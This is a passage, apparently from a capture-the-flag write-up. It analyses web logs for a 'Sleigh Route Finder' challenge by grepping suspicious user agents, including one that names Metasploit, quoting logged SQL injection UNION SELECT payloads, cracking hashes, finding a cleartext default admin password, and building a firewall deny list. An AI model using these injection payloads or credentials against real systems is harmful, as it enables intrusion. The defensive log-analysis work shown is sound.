</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;7db0f6de-8de7-4841-9084-28fa914b0f2e|metasploit|nessus&#34;</span> &gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible msie 5.0;windows_98\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible msie 5.0;windows_98\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 5.01; windows nt 500.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 6.0; windows nt 5.0; .nets clr  1.1.4322\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 6.0; windows nt 5.1; sv1; funwebproducts; .net clr 1.1.4322; .net clr 2.0.50727\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 6.0; windows nt5.1\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 6.1; windows nt6.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 6.a; windows nts\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 7.0; windos nt 6.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 7.0; windos nt 6.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 7.0; windows nt 5.1; antivirxp08; .net clr 1.1.4322\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 7.0; windows nt 5.1; tridents/4.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 8.0; window nt 5.1\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 8.0; windows mt 6.1; trident/4.0; .net clr 1.1.4322; \)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 8.0; windows nt 5.1; tridents/4.0; .net clr 1.1.4322; peoplepal 7.0; .net clr 2.0.50727\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 8.0; windows_nt 5.1; trident/4.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie6.0; windows nt 5.1\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msiee 7.0; windows nt 5.1\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible;msie 7.0;windows nt 5.1\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i<span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible;msie 7.0;windows nt 6.&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0\(compatible; msie 666.0; windows nt 5.1&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 \(compatible; goglebot/2.1; \+http://www.google.com/bot.html\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 \(compatible; msie 10.0; w1ndow nt 6.1; trident/6.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 \(windows nt 10.0;win64;x64\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 \(windows nt 5.1 ; v.\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 \(windows nt 6.1; wow62; rv:53.0\) gecko/20100101 chrome /53.0&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 \(windows; u; windows nt 5.1; en-us\) aplewebkit/525.13 \(khtml, like gecko\) chrome/4.0.221.6 safari/525.13&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 \(windows; u; windows nt 5.1; en-us; rv:1.9.2.3\) gecko/20100401 firefox/3.6.1 \(.net clr 3.5.30731&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 windows; u; windows nt5.1; en-us; rv:1.9.2.3\) gecko/20100401 firefox/3.6.1 \(.net clr 3.5.30729\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla4.0 \(compatible; mssie 8.0; windows nt 5.1; trident/5.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;opera/8.81 \(windows-nt 6.1; u; en\)&#34;</span>&gt;&gt; pivot.ua.json
</code></pre></td></tr></table>
</div>
</div><h3 id="login-the-web-application">Login the web application</h3>
<p>Let&rsquo;s try to find how the attacker could login by looking into our original http.json.malicious
We find some MD5-CRYPT <code>$1$RxS1ROtX$IzA1S3fcCfyVfA9rwKBMi.</code> hash that we can break with john: it&rsquo;s the empty string
Another MD5 hash <code>5e0bd03bec244039678f2b955a2595aa</code> can be cracked to <code>nessus</code></p>
<p>Concatenation of hexadecimals h = &lsquo;0x617664737363616e6e696e67L&rsquo; which translates via python h[2:-1].decode(&lsquo;hex&rsquo;) into &lsquo;avdsscanning&rsquo;
Those are all false positives &hellip;</p>
<pre tabindex="0"><code>&quot;/api/stations?station_id=1' UNION SELECT 1,'automatedscanning','5e0bd03bec244039678f2b955a2595aa','',0,'',''/*&amp;password=MoAOWs&quot;
&quot;/api/weather?station_id=1' UNION SELECT 2,'admin','$1$RxS1ROtX$IzA1S3fcCfyVfA9rwKBMi.','Administrator'/*&amp;file=index&amp;pass=&quot;
&quot;1' UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- '&quot;
</code></pre><p>we can figure out how the attacker could login by looking into our original http.json:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat http.json | jq -j <span style="color:#f1fa8c">&#39; select(.status_code == 200) | .method , &#34; &#34;, .uri , &#34;\n&#34;&#39;</span> | grep -vi <span style="color:#f1fa8c">&#34;api&#34;</span> | sort | uniq -c | sort | head -4
      <span style="color:#bd93f9">1</span> GET /README.md
      <span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><p>We find one README.md file which contains the admin password in cleartext:</p>
<pre tabindex="0"><code># Sled-O-Matic - Sleigh Route Finder Web API

### Installation

sudo apt install python3-pip
sudo python3 -m pip install -r requirements.txt

#### Running:

python3 ./srfweb.py

#### Logging in:

You can login using the default admin pass:

admin 924158F9522B3744F5FCD4D10FAC4356

However, it's recommended to change this in the sqlite db to something custom.
</code></pre><p>We now know about the admin password and the underlying database which is of type sqlite.
We can therefore login.</p>
<h2 id="update-the-firewall-rules">Update the firewall rules</h2>
<p>In developer tools, we can change the firewall settings by typing the following in the console <code>post_rules(['D:&lt;IP1&gt;/0','D:&lt;IP2&gt;/32',...,'A:0.0.0.0/0'])</code>
Let&rsquo;s build a long string with jq:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat http.json.malicious | jq <span style="color:#f1fa8c">&#39;.[&#34;id.orig_h&#34;]&#39;</span> &gt;&gt; bad_ips
cat pivot.ua.json | jq <span style="color:#f1fa8c">&#39;.[&#34;id.orig_h&#34;]&#39;</span> &gt;&gt; bad_ips
cat bad_ips | sort | uniq | tr -d <span style="color:#f1fa8c">&#39;&#34;&#39;</span> | awk <span style="color:#f1fa8c">&#39;{printf(&#34;\&#34;D:%s/32\&#34;,&#34;,$0)}&#39;</span>  | awk <span style="color:#f1fa8c">&#39;{printf(&#34;post_rules([%s\&#34;A:0.0.0.0/0\&#34;])&#34;,$0)}&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>the above command generate the below output that we can type in the firefox developer tools console to get the RID and complete Objective 12</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">post_rules([
  <span style="color:#f1fa8c">&#34;D:0.216.249.31/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:10.122.158.57/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:10.155.246.29/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:102.143.16.184/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:104.179.109.113/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:106.132.195.153/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:106.93.213.219/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:111.81.145.191/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:116.116.98.205/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:118.196.230.170/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:121.7.186.163/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:123.127.233.97/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:126.102.12.53/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:129.121.121.48/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:13.39.153.254/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:131.186.145.73/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:135.203.243.43/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:135.32.99.116/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:140.60.154.239/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:148.146.134.52/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:150.45.133.97/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:150.50.77.238/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:155.129.97.35/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:158.171.84.209/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:168.66.108.62/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:173.37.160.150/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:18.181.152.167/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:186.28.46.179/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:187.152.203.243/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:187.178.169.123/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:19.235.69.221/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:190.245.228.38/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:193.228.194.36/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:2.230.60.70/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:2.240.116.254/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:200.75.228.240/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:203.68.29.5/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:217.132.156.225/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:22.34.153.164/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:220.132.33.81/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:223.149.180.133/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:225.191.220.138/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:226.102.56.13/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:226.240.188.154/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:227.110.45.126/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:229.133.163.235/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:229.229.189.246/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:23.49.177.78/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:23.79.123.99/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:230.246.50.221/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:231.179.108.238/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:238.143.78.114/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:249.237.77.152/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:249.34.9.16/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:249.90.116.138/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:25.80.197.172/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:250.22.86.40/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:252.122.243.212/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:253.182.102.55/32&#34;</span>,
